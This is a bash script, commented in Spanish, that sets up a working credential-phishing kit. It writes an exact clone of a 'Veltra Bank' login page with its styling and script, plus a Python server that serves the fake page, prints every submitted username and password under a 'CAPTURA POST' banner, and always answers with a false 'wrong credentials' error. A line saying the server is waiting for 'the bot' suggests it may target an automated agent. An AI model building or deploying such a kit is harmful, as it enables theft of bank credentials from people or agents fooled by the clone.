#!/usr/bin/env bash
set -e
mkdir -p ~/phish/static

# ---------- index.html (clon EXACTO del login real) ----------
cat > ~/phish/index.html << 'HTML'
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Veltra Bank — Acceso</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/static/styles.css">
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">
        <svg viewBox="0 0 24 24" fill="none"><path d="M4 5l8-2 8 2v6c0 5-3.5 8-8 10C7.5 19 4 16 4 11V5z" stroke="#06122b" stroke-width="2" stroke-linejoin="round"/></svg>
      </span>
      <span>Veltra<b>Bank</b></span>
    </div>
    <div class="pill"><span class="dot"></span> Conexion cifrada &middot; TLS 1.3</div>
  </header>

  <main class="wrap">
    <section class="hero">
      <h1>Tu dinero, <em>blindado</em><br>de punta a punta.</h1>
      <p>Banca digital con verificacion en dos pasos, monitoreo antifraude en tiempo real y cifrado de grado bancario en cada operacion.</p>
      <div class="features">
        <div class="feature">
          <span class="ic"><svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="2"/><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="2"/></svg></span>
          <div><h3>Autenticacion multifactor</h3><p>Codigo de un solo uso en cada inicio de sesion.</p></div>
        </div>
        <div class="feature">
          <span class="ic"><svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
          <div><h3>Proteccion antifraude</h3><p>Analisis de riesgo en milisegundos, 24/7.</p></div>
        </div>
        <div class="feature">
          <span class="ic"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M12 7v5l3 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></span>
          <div><h3>Operaciones al instante</h3><p>Transferencias y pagos acreditados en segundos.</p></div>
        </div>
      </div>
    </section>

    <section class="card">
      <div class="eyebrow">Banca en linea</div>
      <h2>Iniciar sesion</h2>
      <p class="sub">Ingresa con tus credenciales para continuar.</p>

      <div class="alert" id="alert" style="display:none"></div>

      <form id="form-login" autocomplete="off">
        <div class="field">
          <label for="txt-login">Usuario</label>
          <input id="txt-login" name="txtLogin" type="text" placeholder="nombre.apellido" autofocus>
        </div>
        <div class="field">
          <label for="txt-password">Contrasena</label>
          <input id="txt-password" name="txtPassword" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;">
        </div>
        <button id="btn-login" type="submit" class="btn">Continuar</button>
      </form>

      <div class="secure-note">
        <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="2"/><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="2"/></svg>
        Nunca te pediremos tu clave por correo o telefono.
      </div>
    </section>
  </main>

  <script src="/static/veltra.js"></script>
</body>
</html>
HTML

# ---------- veltra.js (idéntico al real; postea a /api/login) ----------
cat > ~/phish/static/veltra.js << 'JS'
(function () {
  "use strict";
  function mostrarError(msg) {
    var el = document.getElementById("alert");
    if (el) { el.textContent = msg; el.style.display = ""; }
  }
  function enviarJSON(url, cuerpo) {
    var opciones = { method: "GET", headers: {} };
    if (cuerpo !== undefined) {
      opciones.method = "POST";
      opciones.headers["Content-Type"] = "application/json";
      opciones.body = JSON.stringify(cuerpo);
    }
    return fetch(url, opciones).then(function (r) { return r.json(); });
  }
  var formLogin = document.getElementById("form-login");
  if (formLogin) {
    formLogin.addEventListener("submit", function (e) {
      e.preventDefault();
      var usuario = document.getElementById("txt-login").value.trim();
      var clave = document.getElementById("txt-password").value;
      enviarJSON("/api/login", { usuario: usuario, clave: clave })
        .then(function (data) {
          if (data && data.ok) { window.location = data.next; }
          else { mostrarError((data && data.error) || "Usuario o contrasena incorrectos."); }
        })
        .catch(function () { mostrarError("Error de red."); });
    });
  }
})();
JS

echo "archivos de la pagina creados"

# ---------- styles.css (idéntico al real) ----------
cat > ~/phish/static/styles.css << 'CSS'
:root {
  --bg-0: #070b16;
  --bg-1: #0d1326;
  --card: rgba(18, 25, 46, 0.72);
  --card-border: rgba(120, 150, 255, 0.16);
  --txt: #eef2ff;
  --txt-dim: #9aa6c7;
  --accent: #5b7cfa;
  --accent-2: #38e0c4;
  --accent-grad: linear-gradient(135deg, #5b7cfa 0%, #38e0c4 100%);
  --danger: #ff6b85;
  --ok: #38e0c4;
  --field: rgba(10, 15, 30, 0.6);
  --field-border: rgba(120, 150, 255, 0.22);
  --shadow: 0 30px 80px -30px rgba(0, 0, 0, 0.8);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; }
body {
  font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  color: var(--txt);
  background:
    radial-gradient(1200px 700px at 15% -10%, rgba(91, 124, 250, 0.22), transparent 60%),
    radial-gradient(900px 600px at 110% 10%, rgba(56, 224, 196, 0.16), transparent 55%),
    linear-gradient(160deg, var(--bg-0), var(--bg-1));
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  -webkit-font-smoothing: antialiased;
}
.topbar { display: flex; align-items: center; justify-content: space-between; padding: 22px 36px; }
.brand { display: flex; align-items: center; gap: 12px; font-weight: 700; letter-spacing: -0.02em; font-size: 20px; }
.brand .logo { width: 36px; height: 36px; border-radius: 11px; background: var(--accent-grad); display: grid; place-items: center; box-shadow: 0 8px 24px -8px rgba(91, 124, 250, 0.9); }
.brand .logo svg { width: 20px; height: 20px; }
.brand span b { background: var(--accent-grad); -webkit-background-clip: text; background-clip: text; color: transparent; }
.topbar .pill { display: inline-flex; align-items: center; gap: 7px; font-size: 12.5px; color: var(--txt-dim); border: 1px solid var(--card-border); border-radius: 999px; padding: 7px 14px; background: rgba(255,255,255,0.02); }
.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--ok); box-shadow: 0 0 10px var(--ok); }
.wrap { flex: 1; display: grid; grid-template-columns: 1.05fr 0.95fr; gap: 40px; align-items: center; max-width: 1120px; width: 100%; margin: 0 auto; padding: 24px 36px 56px; }
.hero h1 { font-size: clamp(30px, 4vw, 46px); line-height: 1.05; letter-spacing: -0.03em; font-weight: 800; margin-bottom: 18px; }
.hero h1 em { font-style: normal; background: var(--accent-grad); -webkit-background-clip: text; background-clip: text; color: transparent; }
.hero p { color: var(--txt-dim); font-size: 16px; max-width: 46ch; line-height: 1.6; }
.features { margin-top: 30px; display: grid; gap: 14px; }
.feature { display: flex; gap: 13px; align-items: flex-start; }
.feature .ic { flex: none; width: 38px; height: 38px; border-radius: 11px; display: grid; place-items: center; background: rgba(91, 124, 250, 0.12); border: 1px solid var(--card-border); color: var(--accent-2); }
.feature .ic svg { width: 19px; height: 19px; }
.feature h3 { font-size: 14.5px; font-weight: 650; margin-bottom: 3px; }
.feature p { font-size: 13px; color: var(--txt-dim); max-width: none; }
.card { background: var(--card); border: 1px solid var(--card-border); border-radius: 22px; padding: 34px 32px; backdrop-filter: blur(22px); -webkit-backdrop-filter: blur(22px); box-shadow: var(--shadow); width: 100%; max-width: 420px; justify-self: end; }
.card .eyebrow { font-size: 12px; letter-spacing: 0.14em; text-transform: uppercase; color: var(--accent-2); font-weight: 650; }
.card h2 { font-size: 24px; letter-spacing: -0.02em; margin: 8px 0 4px; }
.card .sub { color: var(--txt-dim); font-size: 14px; margin-bottom: 24px; }
.field { margin-bottom: 16px; }
.field label { display: block; font-size: 13px; color: var(--txt-dim); margin-bottom: 7px; font-weight: 550; }
.field input { width: 100%; background: var(--field); border: 1px solid var(--field-border); border-radius: 12px; padding: 13px 15px; color: var(--txt); font-size: 15px; outline: none; transition: border-color 0.18s, box-shadow 0.18s; }
.field input::placeholder { color: #5b678a; }
.field input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(91, 124, 250, 0.18); }
.btn { width: 100%; border: none; border-radius: 12px; padding: 14px 18px; font-size: 15px; font-weight: 650; color: #06122b; background: var(--accent-grad); cursor: pointer; transition: transform 0.12s, box-shadow 0.18s, filter 0.18s; box-shadow: 0 14px 30px -12px rgba(91, 124, 250, 0.8); }
.btn:hover { filter: brightness(1.05); }
.alert { border-radius: 11px; padding: 11px 14px; font-size: 13.5px; margin-bottom: 18px; border: 1px solid rgba(255, 107, 133, 0.3); background: rgba(255, 107, 133, 0.1); color: #ffd2db; }
.secure-note { margin-top: 20px; display: flex; align-items: center; gap: 9px; font-size: 12px; color: var(--txt-dim); justify-content: center; }
.secure-note svg { width: 14px; height: 14px; color: var(--ok); }
@media (max-width: 860px) { .wrap { grid-template-columns: 1fr; gap: 28px; padding: 16px; } .card { justify-self: stretch; max-width: none; } .hero { order: 2; } .topbar { padding: 18px 16px; } }
CSS

# ---------- serve.py (sirve estáticos + pagina + captura /api/login) ----------
cat > ~/phish/serve.py << 'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import json, os
BASE = os.path.expanduser('~/phish')
def read(p):
    with open(p,'rb') as f: return f.read()
class H(BaseHTTPRequestHandler):
    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/static/styles.css':
            self._send(read(BASE+'/static/styles.css'), 'text/css; charset=utf-8')
        elif path == '/static/veltra.js':
            self._send(read(BASE+'/static/veltra.js'), 'application/javascript; charset=utf-8')
        else:
            self._send(read(BASE+'/index.html'), 'text/html; charset=utf-8')
    def do_POST(self):
        n = int(self.headers.get('Content-Length',0) or 0)
        body = self.rfile.read(n).decode('utf-8','replace')
        print("\n============================================")
        print("*** CAPTURA POST", self.path, "***")
        try: print("   >>>", json.loads(body))
        except: print("   >>>", body)
        print("============================================\n")
        out = b'{"ok":false,"error":"Usuario o contrasena incorrectos."}'
        self.send_response(200); self.send_header('Content-Type','application/json')
        self.send_header('Content-Length', str(len(out))); self.end_headers()
        self.wfile.write(out)
    def log_message(self,*a): print(self.address_string(), self.command, self.path)
print("Servidor de captura en :8000  (esperando al bot)")
HTTPServer(('0.0.0.0',8000), H).serve_forever()
PY

echo ""
echo "=== TODO LISTO ==="
echo "archivos:"; ls -R ~/phish
echo ""
echo "Ahora corre:  pkill -f serve.py; cd ~/phish && python3 serve.py"
